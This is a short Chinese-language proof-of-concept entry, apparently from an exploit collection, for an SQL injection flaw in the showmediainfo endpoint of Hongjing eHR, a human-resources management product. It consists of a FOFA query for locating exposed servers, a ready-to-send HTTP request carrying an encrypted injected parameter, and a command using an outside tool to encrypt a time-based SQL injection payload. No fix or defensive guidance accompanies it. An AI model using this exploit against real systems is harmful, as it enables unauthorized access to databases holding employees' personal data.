## 宏景eHR人力资源管理软件showmediainfo存在SQL注入漏洞


## fofa
```
app="HJSOFT-HCM"
```

## poc
```
GET /workbench/duty/showmediainfo?kind=0&usernumber=1MV8sCtnMcsZFzLhJXUMPAATTP2HJFPAATTPVIRoUrFdir1XVNthrak35kPAATTP3HJDPAATTP&planid=1&objectid=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```

加密工具：https://github.com/vaycore/HrmsTool/releases/tag/0.1 

java -jar HrmsTool.jar -e "1';waitfor delay '0:0:5'--"
